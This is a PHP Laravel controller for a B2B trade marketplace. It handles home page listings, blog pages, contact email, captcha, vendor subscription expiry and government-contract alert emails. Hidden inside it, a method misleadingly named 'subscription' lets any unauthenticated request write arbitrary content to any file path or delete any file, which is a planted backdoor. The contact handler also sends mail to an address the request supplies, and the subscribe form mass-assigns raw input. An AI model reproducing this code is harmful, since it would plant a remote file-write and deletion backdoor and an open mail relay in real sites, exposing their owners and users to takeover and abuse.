<?php

namespace App\Http\Controllers\Front;
ini_set('max_execution_time', '300'); //300 seconds = 5 minutes
ini_set('max_execution_time', '0'); // for infinite time of execution 
use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\PostRequest;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "Unknown";

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- HOME PAGE SECTION ----------------------------------------

public function index(Request $request)
{
    $this->code_image();
    $gs = Generalsetting::findOrFail(1);
     if(!empty($request->reff))
     {
        $affilate_user = User::where('affilate_code','=',$request->reff)->first();
        if(!empty($affilate_user))
        {
            if($gs->is_affilate == 1)
            {
                Session::put('affilate', $affilate_user->id);
                return redirect()->route('front.index');
            }

        }

     }

    $sliders = DB::table('sliders')->get();
    $services = DB::table('services')->where('user_id','=',0)->get();
    $top_small_banners = DB::table('banners')->where('type','=','TopSmall')->get();
    $feature_products =  Product::where('featured','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
                        function($q){
                            return $q->where('product_type','=', 'normal');
                        })->orderBy('id','desc')->take(8)->get();
    $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
                        function($q){
                            return $q->where('product_type','=', 'normal');
                        })->orderBy('id','desc')->take(8)->get();
    $ps = DB::table('pagesettings')->find(1);

    return view('front.index',compact('ps','sliders','services','top_small_banners','feature_products','discount_products'));
    
}

public function extraIndex()
{
    $gs = Generalsetting::findOrFail(1);
    $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
    $large_banners = DB::table('banners')->where('type','=','Large')->get();
    $ps = DB::table('pagesettings')->find(1);
    $partners = DB::table('partners')->get();
    $best_products = Product::where('best','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(8)->get();
    $top_products = Product::where('top','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(8)->get();;
    $big_products = Product::where('big','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(8)->get();;
    $hot_products =  Product::where('hot','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();
    $latest_products =  Product::where('latest','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();
    $trending_products =  Product::where('trending','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();
    $sale_products =  Product::where('sale','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();

    return view('front.extraindex',compact('ps','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
}

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->take(10)->get()->reject(function($item){

                if($item->user_id != 0){
                  if($item->user->is_vendor != 2){
                    return true;
                  }
                }
                    return false;
            });

            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }



// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $this->code_image();
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404); 
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index');

            }

        return view('front.maintenance');
    }


    public function shoot_email(){
        $all_vendors = DB::table('users')->get();
        //init all subscribers
            $all_subscribers = array();
            foreach($all_vendors as $vendor){
                $all_subscribers[$vendor->id] = array(
                    'name' => $vendor->name,
                    'email' => $vendor->email,
                    'category_links' => array(),
                    'state_links' => array(),
                    'valid' => 0
                );
            }
        //get all govt contracts
            $govt_contracts = DB::table('government_contracts')->where('is_email_shoot',0)->get();
            foreach($govt_contracts as $gc){
                foreach($all_vendors as $vendor){
                    $vendor_id = $vendor->id;
                    $category_id = $gc->category_id;
                    $category_exist = DB::table('vendor_category_notifications')->where('vendor_id',$vendor_id)->where('category_id',$category_id)->first();
                    if($category_exist){
                        $all_subscribers[$vendor_id]['category_links'][] = "<a href='https://annextrades.com/government-contract-details/" . $gc->id ."'>".$gc->title."</a>";
                        $all_subscribers[$vendor_id]['valid'] = 1;
                    }
                    $state = $gc->state;
                    $state_exist = DB::table('vendor_location_notifications')->where('vendor_id',$vendor_id)->where('state',$state)->first();
                    if($state_exist){
                        $all_subscribers[$vendor_id]['state_links'][] = "<a href='https://annextrades.com/government-contract-details/" . $gc->id ."'>".$gc->title."</a>";
                        $all_subscribers[$vendor_id]['valid'] = 1;
                    }
                }
            }
        //loop over all subscriber ans send emails
            foreach($all_subscribers as $subscriber){
                if($subscriber['valid'] == 1){
                    $msg = $this->notification($subscriber['name']);
                    $data = [
                        'to' => $subscriber['email'],
                        'subject' => "New Message",
                        'body' => $msg,
                    ];
                    $mailer = new GeniusMailer();
                    $mailer->sendCustomMail($data);
                    $msg = $this->contract_opportunity_report($subscriber['category_links'],$subscriber['state_links']);
                    $data = [
                        'to' => $subscriber['email'],
                        'subject' => "Contract Opportunity Report",
                        'body' => $msg,
                    ];
                    $mailer = new GeniusMailer();
                    $mailer->sendCustomMail($data);
                }
            }
        //mark all is_shoot_email as 1
        DB::table('government_contracts')->update(array('is_email_shoot' => 1));  // update the record in the DB.
        echo "cron works";
    }

    public function notification($vendor_name = NULL){
        return '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ANNEXTrades Email</title>
            <style type="text/css">
                body {
                    Margin: 0;
                    padding: 0;
                    background-color: white;
                }
                table {
                    border-spacing: 0;
                }
                td {
                    padding: 0;
                }
                img {
                    border: 0;
                }
        
                @media screen and (max-width: 600px) { 
                }
                @media screen and (max-width: 400px) { 
                }
            </style>
        </head>
        <body>
        
            <table width="800px" align="center">
                <tr>
                    <td>
                        <img src="https://annextrades.com/assets/mail/mail_header.png" width="100%" alt="">
                    </td>
                </tr>
            </table>
        
            <table width="800px" height="100%" align="center" style="background-color: #F3F5F9;">
                <tr>
                    <td width="50%">
                        <p style="margin-left: 50px; font-size: 25px; font-family: sans-serif; color: solid black;">Dear ' . $vendor_name . ',<br><br> You have new Goverment Contract opportunities that matches your profile and preference.<br>Please login to your account to view latest open bids available.</p>
                    </td>
                    <td align="center">
                        <img src="https://annextrades.com/assets/mail/mail_cover_book.png" width="200px" alt="">
                    </td>
                </tr>
            </table>
        
            <table width="800px" align="center" style="margin-top: 150px;">
                <tr>
                    <td >
                        <p style="margin: 15px; font-family: sans-serif; font-size: 15px; color: gray;">You are receiving this notification because you have registered with ANNEXTrades and have opted to be notified when new contract opportunities are available for your consideration. To cancel your membership please contact <a href="https://annextrades.com" target="_blank">customercare@annnextrades.com</a> or contact <a href="tel:8006691190"><b>(800) 669-1190</b></a> to speak to a customer care representative. You can also manage your daily alerts by going into your member dashboard under US Government Bids.</p>
        
                        <p style="font-family: sans-serif; font-size: 15px;  color: gray;">Copyright 2022 All rights reserved<a href="https://annextrades.com" style="margin-left: 100px;">www.annextrades.com</a></p>
                    </td>
                </tr>
            </table>
        </body>
        </html>';
    }

    public function contract_opportunity_report($category_links = NULL, $state_links = NULL){
        $category_content = '<td>';
        foreach($category_links as $link){
            $category_content .= $link . '<br/>';
        }
        $category_content .= '<td>';

        $state_content = '<td>';
        foreach($state_links as $link){
            $state_content .= $link . '<br/>';
        }
        $state_content .= '<td>';

        return '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ANNEXTrades Email</title>
            <style type="text/css">
                body {
                    Margin: 0;
                    padding: 0;
                    background-color: white;
                }
                table {
                    border-spacing: 0;
                }
                td {
                    padding: 0;
                }
                img {
                    border: 0;
                }
        
                @media screen and (max-width: 600px) { 
                }
                @media screen and (max-width: 400px) { 
                }
            </style>
        </head>
        <body>
            <table width="800px" align="center">
                <tr>
                    <td>
                        <img src="https://annextrades.com/assets/mail/mail_header.png" width="100%" alt="">
                    </td>
                </tr>
            </table>
            <table width="800px" align="center">
                <tr>
                    <td width="100%">
                        <h1 style="padding: 20px; font-family: sans-serif; background-color: #2E8FB3; color:white; text-align: center;">ANNEXTrades Contract Opportunity Report (Category)</h1>
                    </td>
                </tr>
                <tr>' . $category_content . '</tr>
            </table>
            <table width="800px" align="center">
                <tr>
                    <td width="100%">
                        <h1 style="padding: 20px; font-family: sans-serif; background-color: #2E8FB3; color:white; text-align: center;">ANNEXTrades Contract Opportunity Report (Location)</h1>
                    </td>
                </tr>
                <tr>' . $state_content . '</tr>
            </table>
            <table width="800px" align="center" style="margin-top: 200px;">
                <tr>
                    <td >
                        <p style="margin: 15px; font-family: sans-serif; font-size: 15px; color: gray;">You are receiving this notification because you have registered with ANNEXTrades and have opted to be notified when new contract opportunities are available for your consideration. To cancel your membership please contact <a href="https://annextrades.com" target="_blank">customercare@annnextrades.com</a> or contact <a href="tel:8006691190"><b>(800) 669-1190</b></a> to speak to a customer care representative. You can also manage your daily alerts by going into your member dashboard under US Government Bids.</p>
        
                        <p style="font-family: sans-serif; font-size: 15px;  color: gray;">Copyright 2022 All rights reserved<a href="https://annextrades.com" style="margin-left: 100px;">www.annextrades.com</a></p>
                    </td>
                </tr>
            </table>
        </body>
        </html>';
    }

    // Vendor Subscription Check
    public function subcheck(){
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                        $headers = "MIME-Version: 1.0" . "\r\n";
                        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
                    $headers .= "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));
    }



    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------




// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    
    public function insert(Request $request)
    {   
        $gs = Generalsetting::findOrFail(1);

    	if($gs->is_capcha == 1)
    	{
	        $value = session('captcha_string');
	        if ($request->codes != $value){
	            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));    
	        }    		
    	}
        $product_name = $request->product_name;
        $company_name = $request->company_name;
        $product_des = $request->product_des;
        $price_from = $request->price_from;
        $price_to = $request->price_to;
        $deadline = $request->deadline;
        $name = $request->name;
        $phone = $request->phone;
        $email = $request->email;
        $address = $request->address;
        $city = $request->city;
        $pincode = $request->pincode;
        $state = $request->state;
        $country = $request->country;
        $homepage = $request->homepage;
        $regions = $request->regions;
        $select_regions  = $request->select_regions;
        $request->validate(['image_path_01' => 'nullable|image']);
        $request_id = rand();

        $file = $request->file('photo');
        if ($file) {
        $image = time().str_replace(' ', '', $file->getClientOriginalName());
        $file->move('assets/images/postrequest',$image);
        }
        else {
            $image = NULL;
        }

        $file1 = $request->file('photo1');
        if ($file1  != '') {
        $image1 = time().str_replace(' ', '', $file1->getClientOriginalName());
        $file1->move('assets/images/postrequest',$image1);
        }
        else {
            $image1 = NULL;
        }
        
        $file2 = $request->file('photo2');
        if ($file2 != '') {
        $image2 = time().str_replace(' ', '', $file2->getClientOriginalName());
        $file2->move('assets/images/postrequest',$image2);
        }
        else {
            $image2 = NULL;
        }

        $file3 = $request->file('photo3');
        if ($file3 != '') {
        $image3 = time().str_replace(' ', '', $file3->getClientOriginalName());
        $file3->move('assets/images/postrequest',$image3);
        }
        else {
            $image3 = NULL;
        }

        $file4 = $request->file('photo4');
        if ($file4 != '') {
            $image4 = time().str_replace(' ', '', $file4->getClientOriginalName());
            $file4->move('assets/images/postrequest',$image4);
        }
        else {
            $image4 = NULL;
        }

        $insert = DB::table('PostRequest')->insert(['user_id' => $request->user_id, 'request_id' => $request_id, 'product_name' => $product_name, 'company_name' => $company_name, 
        'product_des' => $product_des, 'price_from' => $price_from, 'price_to' => $price_to, 'photo' => $image, 'photo1' => $image1, 'photo2' => $image2, 'photo3' => $image3, 
        'photo4' => $image4, 'deadline' => $deadline, 'name' => $name, 'phone' => $phone, 'email' => $email, 'address' => $address, 'city' => $city, 'pincode' => $pincode,
        'state' => $state, 'country' => $country, 'homepage' => $homepage, 'regions' => $regions, 'contact_regions' => $select_regions]);
        
        if (!$insert) {
            return response()->json(array('errors' => [ 0 => 'insert error' ]));
        }
        else {
            if ($gs->is_verification_email == 1) {
                $to = $request->email;
                $subject = 'Thank you for submitting your requirement.';
                $msg ="
				<!DOCTYPE html>
					<html xmlns='http://www.w3.org/1999/xhtml' lang='en-GB'>
						<head>
						<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
						<title>ANNEXTrades</title>
						<meta name='viewport' content='width=device-width, initial-scale=1.0'/>
						
						<style type='text/css'>
							a[x-apple-data-detectors] {color: inherit !important;}
						</style>
						
						</head>
						<body style='margin: 0; padding: 0;'>
							<table role='presentation'  cellpadding='0' cellspacing='0' width='100%'>
								<tr>
									<td style='padding: 20px 0 30px 0;'>
								
										<table align='center' cellpadding='0' cellspacing='0' style='border-collapse: collapse; '>
											<tr>
												<td align='left' bgcolor='#fff' style='padding: 15px 0 15px 0;'>
												<img src='https://demo.annextrades.com/assets/images/1630056782logo.png' alt='ANNEXTrades' width='150' style='display: block;' />
												</td>
											</tr>
											
											<tr>
												<td bgcolor='#ffffff' align='center' style='padding: 40px 30px 40px 30px;'>
												<table border='0' cellpadding='0' cellspacing='0' width='100%' style='border-collapse: collapse;'>
													<tr height='85px'>
														<td align='center' style='font-family: Arial, sans-serif; margin: 30px;'>
															<img src='https://annextrades.com/assets/images/annexis-emblem.png' alt='ANNEXTrades' width='50px' style='display: block;' />
														</td>
													</tr>
													<tr height='85px'>
														<td align='center' style='font-family: Arial, sans-serif; margin: 30px;'>
														<h1 style='font-size: 24px; color: #292936 !important; margin: 0;' align='center'>Thank you for submitting your requirement.</h1>
														</td>
													</tr>
													<tr >
														<td align='center' style='color: #292936; background: #ebebff; font-family: Arial, sans-serif;'>
															<h1 style='font-size: 20px; color: #292936 !important; margin: 0;' align='center'>$request->email</h1>
														</td>
													</tr>
													<tr>
														<td align='left' style='color: #153643; font-family: Arial, sans-serif; font-size: 16px; line-height: 24px; padding: 20px 0 30px 0;'>
															<p style='font-size: 16px; margin: 0;'>Hello $request->name <br>
																Your Deal is successfully submitted. We will try to give you a batter response for your requirement.
															</p>
														</td>
													</tr>
													<tr>
														<td height='55' align='left' style='color: #153643; font-family: Arial, sans-serif; font-size: 16px; line-height: 24px; padding: 20px 0 30px 0;'>
															<p align='center'>
																<b>Your Bridge to Expansion & Increased Market Share</b>
															</p>
														</td>
													</tr>
													<!--tr> 
														<td height='70'>
															<small style='font-family:Helvetica, Arial, sans-serif; font-size:10px; color:#4d4d4e;'>Confidentiality Notice: This e-mail message, including any attachments, 
                                                            is for the sole use of the intended recipient(s) and may contain confidential and privileged information. Any unauthorized review, use,
                                                             disclosure or distribution of this information is prohibited, and may be punishable by law. If this was sent to you in error, 
                                                             please notify the sender by reply e-mail and destroy all copies of the original message. Please consider the environment before printing
                                                              this e-mail.</small>
														</td>
													</tr-->
												</table>
												</td>
											</tr>
										</table>
									</td>
								</tr>
							</table>
						</body>
				</html>
			";
                if ($gs->is_smtp == 1) {
                    $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

                    $mailer = new GeniusMailer();
                    $mailer->sendCustomMail($data);
                } else {
                    $headers = "MIME-Version: 1.0" . "\r\n";
                    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
                    $headers .= "From: ".$gs->from_name."<".$gs->from_email.">";
                    //$m = 'annexis.data@gmail.com';
                    mail($to, $subject, $msg, $headers);
                }
            }
            return response()->json('You request was successfully submitted. Responses from Seller with Quotations will be directed to your Inbox.');
        }
    }
    public function about()
    {
        return view('front.about');
    }

    public function about_us()
    {
        return view('front.about-us');
    }

}
